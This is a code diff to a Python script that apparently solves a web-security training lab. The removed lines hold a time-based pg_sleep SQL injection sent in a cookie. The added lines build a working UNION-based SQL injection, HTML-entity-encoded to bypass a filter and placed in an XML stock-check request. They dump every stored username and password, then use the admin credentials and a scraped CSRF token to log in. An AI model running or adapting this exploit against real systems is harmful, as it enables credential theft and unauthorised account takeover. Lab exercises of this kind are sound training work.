@@ -5,7 +5,6 @@ import argparse
 import requests
 import urllib3
 import string
-import time
 import re
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -51,21 +50,59 @@ def verify_lab_solved(url):
 
 
 def solve_lab(url, proxies):
+    url = urljoin(url, "/product/stock")
+
+    payload = "4444 UNION SELECT username || ':' || password FROM users"
+    print_info(f'HTML-encoding payload "{payload}"...')
+
+    payload = "".join([f"&#{ord(char)};" for char in payload])
+    print_success(f'HTML-encoded payload: "{payload}"\n')
+
+    headers = {"Content-Type": "application/xml"}
+    data = f'<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>{payload}</storeId></stockCheck>'
+
     print_info(
-        f'Causing a 10 second delay by visiting "{url} with the following cookies:'
+        f'Performing a UNION attack with the following POST request to "{url}":\n'
     )
-    print('{"TrackingId": "\' || (select 1 from pg_sleep(10)) --"}')
+    print(f"headers: {headers}")
+    print(f"data: {data}\n")
 
-    cookies = {"TrackingId": "' || (select 1 from pg_sleep(10)) --"}
-    start = time.perf_counter()
-    requests.get(url, proxies=proxies, verify=False, cookies=cookies)
-    end = time.perf_counter()
+    resp = requests.post(url, proxies=proxies, verify=False, headers=headers, data=data)
+    print_success(f"Extracted the following credentials:\n{resp.text}")
 
-    response_time = end - start
-    if response_time > 10:
-        print_success(f"Response time: {response_time} seconds\n")
+    for credentials in resp.text.splitlines():
+        username, password = credentials.split(":")
+        if username.startswith("admin"):
+            print()
+            break
     else:
-        print_fail(f"Response time: {response_time} seconds")
+        print_fail("Unable to find admin credentials")
+
+    url = urljoin(url, "/login")
+    print_info(f'Grabbing CSRF value from "{url}"...')
+
+    s = requests.session()
+    resp = s.get(url, proxies=proxies, verify=False)
+    soup = BeautifulSoup(resp.text, "html.parser")
+    csrf = soup.select_one('input[name="csrf"]').get("value")
+
+    if csrf is None:
+        print_fail("Unable to grab CSRF value.")
+
+    else:
+        print_success(f"CSRF value: {csrf}\n")
+
+    data = {"csrf": csrf, "username": username, "password": password}
+    print_info("Logging in with the following values:")
+    print(data)
+
+    resp = s.post(
+        url,
+        proxies=proxies,
+        verify=False,
+        data=data,
+    )
+    print_success("SQL injection attack performed.\n")
 
 
 def main():
